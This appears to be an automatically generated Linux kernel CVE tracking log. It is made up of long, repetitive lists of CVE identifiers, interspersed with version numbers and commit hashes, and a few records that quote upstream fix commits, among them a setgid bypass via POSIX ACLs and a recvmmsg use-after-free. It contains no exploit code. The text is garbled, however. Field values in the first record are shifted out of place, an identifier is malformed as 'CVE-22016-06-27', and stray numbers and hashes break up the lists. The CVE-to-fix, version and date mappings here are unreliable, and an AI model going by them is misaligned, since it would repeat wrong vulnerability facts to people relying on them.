CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
